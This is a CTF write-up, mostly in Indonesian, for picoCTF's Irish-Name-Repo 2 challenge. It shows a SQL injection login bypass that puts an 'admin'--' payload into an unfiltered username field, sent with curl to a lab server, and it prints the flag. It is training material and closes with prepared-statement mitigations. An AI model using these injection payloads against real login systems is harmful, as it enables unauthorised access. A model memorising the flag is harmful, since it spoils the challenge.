# Writeup: Irish-Name-Repo 2 (Challenge ID: 59)

- Platform: CyLab Security Academy (picoCTF)
- Category: Web Exploitation / SQL Injection & Authentication Bypass
- Difficulty: Medium (diff=2)
- Author: Xingyang Pan
- Event: picoCTF 2019
- Points: 350
- Flag: `academy{m0R3_SQL_plz_69744d2d}` (Komunitas: `CTF{m0R3_SQL_plz_69744d2d}`)

---

## Problem Statement & Scope

Tantangan menguji pemahaman teknik bypass filter injeksi SQL pada sistem otentikasi web:
> *"Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login!"*
> 
> Petunjuk:
> *"the password is being filtered"*

Peserta disajikan portal web database nama-nama Irlandia yang menyediakan form login otentikasi administrator (`login.html` → `login.php`). Setelah insiden pembobolan sebelumnya (Irish-Name-Repo 1), pengembang memperketat sistem dengan menerapkan filter kata kunci pada kolom kata sandi (`password`). Lingkup asesmen mencakup audit batasan validasi input, pengujian filter blacklist, dan identifikasi vektor injeksi alternatif melalui kolom masukan yang tidak terlindungi.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Konkatenasi String Tidak Aman pada Query SQL (CWE-89):**
   - Berdasarkan NIST SP 800-115 (*Section 5.2: Database and Web Vulnerability Assessment*), menyusun query basis data menggunakan interpolasi string langsung dari input pengguna tanpa prepared statements merupakan kelemahan mendasar.
   - Struktur query backend pada aplikasi:
     ```php
     $query = "SELECT * FROM users WHERE name='$username' AND password='$password'";
     ```

2. **Asimetri Validasi Input & Kegagalan Blacklist Filtering (CWE-184 / CWE-89):**
   - Pengembang hanya menerapkan filter pembersihan pada parameter `password` (menyaring kata kunci seperti `OR`, `or`, atau tanda kutip tertentu), tetapi lalai mengamankan parameter `username`.
   - Karena SQLite memperlakukan karakter dua tanda minus berurutan (`--`) sebagai awal komentar satu baris, penyerang dapat menyuntikkan payload auth bypass ke kolom `username`:
     ```sql
     admin'--
     ```
   - Ketika string tersebut diinterpolasikan ke dalam query:
     ```sql
     SELECT * FROM users WHERE name='admin'--' AND password='password'
     ```
   - Mesin query SQLite membaca `WHERE name='admin'` sebagai kondisi akhir dan mengabaikan klausul `' AND password='...'`. Query berhasil mencocokkan record akun `admin` dan memberikan hak akses administratif penuh beserta flag.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Enumerasi Endpoint & Analisis Form:**
   - Akses aplikasi target melalui peramban atau cURL. Endpoint `login.html` menyediakan form POST ke `login.php`:
     ```html
     <form action="login.php" method="POST">
       <input type="text" name="username">
       <input type="password" name="password">
       <input type="hidden" name="debug" value="1">
       <input type="submit" value="Login">
     </form>
     ```

2. **Pengujian Filter Parameter Password:**
   - Mengirimkan `' OR 1=1--` pada kolom password memicu deteksi filter blacklist (*"SQLi detected"*), mengonfirmasi petunjuk lab bahwa kolom password difilter ketat.

3. **Penyusunan Payload Auth Bypass via Username:**
   - Alihkan fokus injeksi ke parameter `username`.
   - Gunakan payload penutup string dan komentar baris: `admin'--`.
   - Berikan nilai dummy sembarang pada parameter `password`.

4. **Eksekusi Penyerangan Melalui HTTP POST:**
   - Kirim permintaan POST dengan parameter `debug=1` untuk memantau eksekusi SQL internal:
     ```bash
     curl -s -X POST "http://chatelaine.cylabacademy.net:40085/login.php" \
       -d "username=admin'--" \
       -d "password=password" \
       -d "debug=1"
     ```
   - Respon server:
     ```html
     <pre>username: admin'--
     password: password
     SQL query: SELECT * FROM users WHERE name='admin'--' AND password='password'
     </pre>
     <h1>Logged in!</h1>
     <p>Your flag is: academy{m0R3_SQL_plz_69744d2d}</p>
     ```

---

## Flag & Verifikasi

- **Flag Resmi:** `academy{m0R3_SQL_plz_69744d2d}`
- **Flag Komunitas:** `CTF{m0R3_SQL_plz_69744d2d}`
- **Bukti Validasi:** REST API CyLab `POST /api/submissions/` merespons dengan status HTTP 201 Created:
  ```json
  {"user": 1072359, "challenge": 59, "flag": "academy{m0R3_SQL_plz_69744d2d}", "correct": true, "historical": false}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Terapkan Parameterized Queries (Prepared Statements):**
   - Jangan pernah mengandalkan konkatenasi string. Gunakan PDO atau SQLite3 prepared statements:
     ```php
     $stmt = $db->prepare('SELECT * FROM users WHERE name = :username AND password = :password');
     $stmt->bindValue(':username', $username, SQLITE3_TEXT);
     $stmt->bindValue(':password', $password, SQLITE3_TEXT);
     $result = $stmt->execute();
     ```
2. **Hindari Blacklist Filtering Parsial:**
   - Menyaring input hanya pada satu parameter sementara membiarkan parameter lain terbuka melanggar prinsip *Defense-in-Depth*. Validasi input harus konsisten dan menyeluruh di seluruh titik ingress.
3. **Relevansi Modul LKS Cyber Security:**
   - Dalam kompetisi LKS Cyber Security bidang Web Application Security / Penetration Testing, pengujian celah login bypass menuntut peserta untuk memetakan seluruh input fields (username, email, token) sebelum menyimpulkan bahwa mekanisme keamanan telah absolut.

---

## Solver Script

Solusi reproduktif tersedia pada file terlampir:
`scripts/solve_59_irish_name_repo_2.py`
